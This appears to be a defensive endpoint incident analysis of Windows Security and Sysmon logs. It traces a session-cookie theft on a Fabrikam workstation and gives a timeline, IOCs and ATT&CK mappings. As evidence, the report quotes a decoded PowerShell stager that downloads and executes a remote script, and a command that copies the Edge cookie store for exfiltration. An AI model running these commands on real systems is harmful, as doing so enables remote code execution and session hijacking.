---
source: logs/windows_security.jsonl, logs/sysmon.jsonl
analyst: endpoint-analyst
generated: 2026-07-21
---

# Endpoint Analysis (Windows Security + Sysmon)

## Timeline

Times are local host time (`America/Chicago`), matching the `EventTime` field in both source files.

| Time | Event | Detail |
|---|---|---|
| 07-14 07:58 – 07-16 08:01 | 4624 logons, Outlook/Edge starts | Routine activity on WKS017 (jokafor), WKS029 (pnair), DC01 (adm-tward), WKS042 (schen) |
| 07-15 09:05 | Sysmon 1 (DC01, adm-tward) | `Get-ADUser -Filter *` — routine-looking admin scripting |
| 07-15 22:14 | Security 4625 (WKS029, pnair, src 10.20.30.44) | Single failed logon, internal IP — looks like a self-lockout, not brute force |
| **07-16 11:47:52** | **Sysmon 1 / Security 4688 (WKS042, schen)** | `powershell.exe -nop -w hidden -enc <base64>`, parent `cmd.exe`. Decoded: `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/s.ps1')` |
| **07-16 11:48:05–06** | **Sysmon 1 / Security 4688 (child powershell.exe)** | `Copy-Item -Path 'C:\Users\schen\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies' -Destination 'C:\Users\schen\AppData\Local\Temp\net_cache.dat'` |
| **07-16 11:48:07** | **Security 4663 (object access)** | Direct read access on the Edge `Cookies` file — corroborates the copy |
| **07-16 11:48:09** | **Sysmon 11 (FileCreate)** | Staged file `net_cache.dat` created in `%TEMP%` |
| **07-16 11:48:37** | **Sysmon 3 (NetworkConnect)** | `powershell.exe` → `203.0.113.77:443` — exfil of the staged cookie data |
| 07-17 08:12 | 4624 + Sysmon 1 (WKS042, schen) | Normal morning unlock + browser start — she's at her desk in Chicago |
| 07-17 09:47 | Sysmon 1 (DC01, adm-tward) | `Get-MsolUser -All` — routine-looking, but worth double-checking against cloud audit |
| 07-17 20:11 | Security 4625 (WKS017, jokafor, src 10.20.30.117) | Single failed logon, internal IP — again looks like self-lockout |
| 07-18 09:58 | Security 4672 (DC01, adm-tward) | Special privileges assigned — routine admin |
| remaining events | 4624/Outlook/Edge on WKS017/WKS029/WKS042 | Routine noise through 07-18 |

## IOCs

- Host: `FABRIKAM-WKS042` / User: `FABRIKAM\schen`
- Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (hidden window, base64-encoded command)
- Decoded stager: `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/s.ps1')`
- Targeted file: `C:\Users\schen\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`
- Staged file: `C:\Users\schen\AppData\Local\Temp\net_cache.dat`
- Destination IP: `203.0.113.77:443`

## ATT&CK Techniques

- **T1059.001** PowerShell — High (explicit encoded command execution)
- **T1027** Obfuscated Files or Information — High (base64 `-enc`)
- **T1539** Steal Web Session Cookie — High (direct `Copy-Item` on the Edge cookie store, corroborated by 4663)
- **T1074.001** Local Data Staging — Medium-High (renamed staged file in `%TEMP%`)
- **T1041** Exfiltration Over C2 Channel — Medium (outbound to attacker-controlled IP immediately after staging; exact transfer method not directly observable in this log)
- No registry/scheduled-task/service persistence, no lateral-movement (PsExec/WMI) indicators, and no out-of-place browser flags appear anywhere in this dataset.

## Confidence

- Cookie-theft-and-exfil chain (process → cookie access → stage → network egress): **High** — tight sub-minute timing, explicit target file, direct precursor to the network connection.
- Encoded PowerShell as the entry point on this host: **High** it's the mechanism; **Low/unknown** how the attacker got execution in the first place — no phishing artifact, malicious download, or earlier compromise indicator exists in this data.
- The two 4625 failed logons: **Low** suspicion — internal source IPs, single attempts each, no pattern of repeated failures.
- adm-tward's `Get-ADUser`/`Get-MsolUser` activity: **Low** suspicion standalone, but worth confirming against the cloud audit log.

## Questions

- Did `203.0.113.77` ever show up as a *sign-in* source IP in Azure AD (i.e., was the stolen cookie actually used)?
- Is there any Azure AD activity for `sarah.chen@fabrikam.com` in the ~5 hours after 07-16 11:48 local (16:48 UTC)?
- No file hashes are present in this source — can't pivot via threat intel without one.
- Nothing here explains initial access to `FABRIKAM-WKS042` before the encoded PowerShell ran.
